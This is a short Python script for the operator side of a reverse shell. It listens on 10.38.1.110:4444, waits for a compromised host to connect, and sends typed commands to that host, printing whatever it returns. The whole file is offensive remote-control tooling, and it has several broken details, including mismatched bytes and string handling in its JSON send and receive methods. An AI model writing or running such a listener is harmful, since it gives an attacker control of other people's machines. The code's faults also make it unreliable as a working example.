import socket, json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections.')
        self.connection, address = listener.accept()
        print('[+] Got a connection from ' + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)
    
    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_recieve().decode()
    
    def run(self):
        while True:
            command = input('>> ').encode()
            result = self.execute_remotely(command)
            print(result)
            
my_listener = Listener('10.38.1.110', 4444)
my_listener.run()